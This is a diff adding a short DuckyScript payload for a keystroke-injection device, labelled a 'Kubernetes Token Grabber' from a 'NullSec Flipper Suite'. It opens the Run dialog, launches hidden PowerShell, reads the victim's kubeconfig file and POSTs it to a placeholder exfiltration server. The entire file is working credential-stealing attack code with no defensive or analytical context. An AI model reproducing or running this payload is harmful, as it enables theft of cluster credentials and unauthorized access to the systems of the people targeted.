@@ -1,0 +1,12 @@
+REM ===============================================================
+REM Kubernetes Token Grabber - NullSec Flipper Suite
+REM Extracts kubeconfig and service account tokens
+REM ===============================================================
+REM Target: Linux/macOS/Windows with kubectl
+REM Author: bad-antics
+REM ===============================================================
+
+GUI r
+DELAY 200
+STRING cmd /c "powershell -w hidden -c \"$k=Get-Content $env:USERPROFILE\.kube\config -Raw; Invoke-RestMethod -Uri 'http://EXFIL_SERVER/k8s' -Method POST -Body $k\""
+ENTER
